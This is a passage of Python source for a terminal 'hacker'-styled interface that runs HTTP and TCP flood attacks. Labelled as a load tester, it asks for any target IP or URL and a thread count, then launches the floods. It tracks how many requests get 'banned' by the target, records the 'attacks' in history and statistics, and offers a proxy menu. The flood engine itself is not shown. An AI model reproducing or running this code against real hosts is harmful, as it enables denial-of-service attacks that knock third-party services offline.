        url = input(f"\n{C.GREEN_LIGHT2}Target IP: {C.WHITE}")
        if not url.startswith('http'):
            url = 'http://' + url
        
        threads = safe_int(f"{C.GREEN_LIGHT2}Threads (1-{CONFIG['max_threads']}): {C.WHITE}", 100, 1, CONFIG['max_threads'])
        
        t = LoadTester()
        task = asyncio.create_task(t.start_http(url, threads))
        
        while t.running:
            self.attack_progress(url, threads, t)
            await asyncio.sleep(0.3)
        
        t.stop()
        await task
        
        elapsed = int(time.time() - t.start_time)
        entry = {
            "target": url, "threads": threads, "duration": elapsed,
            "requests": t.requests, "success": t.success, "errors": t.errors,
            "banned": t.banned, "bytes_sent": t.bytes_sent,
            "avg_rate": int(t.requests / elapsed) if elapsed > 0 else 0,
            "timestamp": datetime.now().isoformat()
        }
        save_history(entry)
        s = load_stats()
        s["attacks"] += 1
        s["requests"] += t.requests
        s["success"] += t.success
        s["errors"] += t.errors
        save_stats(s)
        
        self.clear()
        self.matrix_rain(1)
        self.header()
        print(f"{C.GREEN_LIGHT}║{C.RESET}  {C.BOLD}{C.GREEN_LIGHT2}[ATTACK FINISHED]{C.RESET}{' ' * 96}{C.GREEN_LIGHT}║{C.RESET}")
        print(f"{C.GREEN_LIGHT}║{C.RESET}  Requests: {C.WHITE}{t.requests:,}{C.RESET}{' ' * 87}{C.GREEN_LIGHT}║{C.RESET}")
        print(f"{C.GREEN_LIGHT}║{C.RESET}  Success : {C.WHITE}{t.success:,}{C.RESET}{' ' * 88}{C.GREEN_LIGHT}║{C.RESET}")
        print(f"{C.GREEN_LIGHT}║{C.RESET}  Errors  : {C.WHITE}{t.errors:,}{C.RESET}{' ' * 88}{C.GREEN_LIGHT}║{C.RESET}")
        print(f"{C.GREEN_LIGHT}║{C.RESET}  Banned  : {C.WHITE}{t.banned}{C.RESET}{' ' * 89}{C.GREEN_LIGHT}║{C.RESET}")
        print(f"{C.GREEN_LIGHT}║{C.RESET}  Duration: {C.WHITE}{elapsed}s{C.RESET}{' ' * 86}{C.GREEN_LIGHT}║{C.RESET}")
        print(f"{C.GREEN_LIGHT}║{C.RESET}  Avg Rate: {C.WHITE}{int(t.requests/elapsed) if elapsed>0 else 0} r/s{C.RESET}{' ' * 82}{C.GREEN_LIGHT}║{C.RESET}")
        self.footer()
        input(f"\n{C.GREEN_LIGHT2}Press ENTER...{C.RESET}")

    async def tcp_test(self):
        self.clear()
        self.matrix_rain(1)
        self.header()
        print(f"{C.GREEN_LIGHT}║{C.RESET}  {C.BOLD}{C.GREEN_MID}[TCP LOAD TEST]{C.RESET}{' ' * 98}{C.GREEN_LIGHT}║{C.RESET}")
        print(f"{C.GREEN_LIGHT}║{C.RESET}  Type: TCP Flood{' ' * 86}{C.GREEN_LIGHT}║{C.RESET}")
        self.footer()
        
        url = input(f"\n{C.GREEN_LIGHT2}Target URL: {C.WHITE}")
        if not url.startswith('http'):
            url = 'http://' + url
        
        threads = safe_int(f"{C.GREEN_LIGHT2}Threads (1-{CONFIG['max_threads']}): {C.WHITE}", 100, 1, CONFIG['max_threads'])
        
        t = LoadTester()
        task = asyncio.create_task(t.start_tcp(url, threads))
        
        while t.running:
            self.attack_progress(url, threads, t)
            await asyncio.sleep(0.3)
        
        t.stop()
        await task
        
        elapsed = int(time.time() - t.start_time)
        entry = {
            "target": url, "threads": threads, "duration": elapsed,
            "requests": t.requests, "success": t.success, "errors": t.errors,
            "banned": t.banned, "bytes_sent": t.bytes_sent,
            "avg_rate": int(t.requests / elapsed) if elapsed > 0 else 0,
            "timestamp": datetime.now().isoformat()
        }
        save_history(entry)
        s = load_stats()
        s["attacks"] += 1
        s["requests"] += t.requests
        s["success"] += t.success
        s["errors"] += t.errors
        save_stats(s)
        
        self.clear()
        self.matrix_rain(1)
        self.header()
        print(f"{C.GREEN_LIGHT}║{C.RESET}  {C.BOLD}{C.GREEN_MID}[ATTACK FINISHED]{C.RESET}{' ' * 95}{C.GREEN_LIGHT}║{C.RESET}")
        print(f"{C.GREEN_LIGHT}║{C.RESET}  Requests: {C.WHITE}{t.requests:,}{C.RESET}{' ' * 87}{C.GREEN_LIGHT}║{C.RESET}")
        print(f"{C.GREEN_LIGHT}║{C.RESET}  Success : {C.WHITE}{t.success:,}{C.RESET}{' ' * 88}{C.GREEN_LIGHT}║{C.RESET}")
        print(f"{C.GREEN_LIGHT}║{C.RESET}  Errors  : {C.WHITE}{t.errors:,}{C.RESET}{' ' * 88}{C.GREEN_LIGHT}║{C.RESET}")
        print(f"{C.GREEN_LIGHT}║{C.RESET}  Banned  : {C.WHITE}{t.banned}{C.RESET}{' ' * 89}{C.GREEN_LIGHT}║{C.RESET}")
        print(f"{C.GREEN_LIGHT}║{C.RESET}  Duration: {C.WHITE}{elapsed}s{C.RESET}{' ' * 86}{C.GREEN_LIGHT}║{C.RESET}")
        print(f"{C.GREEN_LIGHT}║{C.RESET}  Avg Rate: {C.WHITE}{int(t.requests/elapsed) if elapsed>0 else 0} r/s{C.RESET}{' ' * 82}{C.GREEN_LIGHT}║{C.RESET}")
        self.footer()
        input(f"\n{C.GREEN_LIGHT2}Press ENTER...{C.RESET}")

    def render(self):
        if self.menu == 'main':
            self.main_menu()
        elif self.menu == 'info':
            self.info_menu()
        elif self.menu == 'settings':
            self.settings_menu()
        elif self.menu == 'history':
            self.history_menu()
        elif self.menu == 'stats':
            self.stats_menu()
        elif self.menu == 'logs':
            self.logs_menu()
        elif self.menu == 'proxy':
            self.proxy_menu()

    def run(self):
        try:
            while self.running:
                self.render()
                choice = input(f"\n{C.GREEN_LIGHT2}┌─ {C.GREEN_MID}Input{C.GREEN_LIGHT2} ─────────────────────────────────┐\n{C.GREEN_LIGHT2}│{C.RESET} > {C.YELLOW}").strip()
                print(f"{C.RESET}\n")
                self.handle(choice)
        except KeyboardInterrupt:
            self.clear()
            print(f"""
{C.GREEN_MID}
╔═══════════════════════════════════════════════════════════╗
║        TERMINATING NEURAL LINK...                        ║
║        System Standby Mode Activated                     ║
║        Good Luck, Hacker.                                ║
╚═══════════════════════════════════════════════════════════╝
{C.GREEN_LIGHT2}[ErrorCode404] Session Ended - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{C.RESET}
""")

if __name__ == '__main__':
    ui = UI()
    ui.run()
